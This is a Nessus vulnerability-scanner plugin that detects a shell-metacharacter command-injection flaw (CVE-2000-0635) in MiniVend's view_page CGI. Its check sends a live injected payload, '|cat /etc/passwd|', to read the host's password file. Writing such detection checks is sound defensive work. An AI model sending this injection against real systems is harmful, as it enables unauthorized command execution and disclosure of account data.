#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10473);
 script_bugtraq_id(1449);
 script_osvdb_id(372);
 script_version ("$Revision: 1.27 $");
 script_cve_id("CVE-2000-0635");

 script_name(english:"MiniVend view_page.html Shell Metacharacter Arbitrary Command Execution");
 script_summary(english:"Checks for the presence of /cgi-bin/simple/view_page");
 
 script_set_attribute( attribute:"synopsis",  value:
"A web application on the remote host has an arbitrary command
execution vulnerability." );
 script_set_attribute( attribute:"description",  value:
"The version of MiniVend running on the remote host has an arbitrary
command execution vulnerability.  Input to the 'mv_arg' parameter
of view_page.html is not properly sanitized.  A remote attacker
could exploit this to execute arbitrary commands on the system." );
 script_set_attribute(
   attribute:"see_also",
   value:"http://seclists.org/bugtraq/2000/Jul/150"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of this software."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"plugin_publication_date", value: "2000/07/16");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/07/11");
 script_cvs_date("$Date: 2016/11/18 19:03:16 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 
 script_copyright(english:"This script is Copyright (C) 2000-2016 Tenable Network Security, Inc.");

 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

foreach dir (cgi_dirs())
{
 req = string(dir, "/simple/view_page?mv_arg=|cat%20/etc/passwd|");
 r = http_send_recv3(method:"GET", item:req, port:port);
 if (isnull(r)) exit(1, "The web server didn't respond.");

 if(egrep(pattern:"root:.*:0:[01]:", string:r[2]))security_hole(port);
}
